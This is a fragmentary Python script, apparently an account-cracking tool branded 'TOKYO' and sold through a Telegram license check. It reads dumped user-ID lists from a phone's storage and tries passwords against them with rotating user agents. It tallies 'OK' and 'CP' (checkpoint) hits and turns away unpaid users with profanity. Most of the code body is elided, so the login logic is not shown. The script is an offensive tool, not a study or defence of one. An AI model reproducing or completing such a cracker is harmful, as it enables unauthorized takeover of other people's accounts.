...
def banner():
	print(f'''\t{M} 
	 ...
	 \x1b[92;1mTHIS TOOL CRATE BY TOKYO
...
def menu(my_name,my_id):
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		exit()
	elif _____alvino__adijaya_____ in ['99']:
		exit()
...
def crack_file():
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/TOKYO-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/TOKYO-DUMP/'+geh,'r').read().splitlines()
		except:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ TOKYO ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ TOKYO ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def xoshnaw():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;91m  FREE USERS FUK OFF DONT INBOX ME.[QUTA]")
      os.system('am start https://t.me/KaK_Quta?text=Hi+QUTA+i+Want+to+pay+for+this+linces:+'+id+'>/dev/null');jeda(1)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/TOKYO-DUMP')
	except:pass
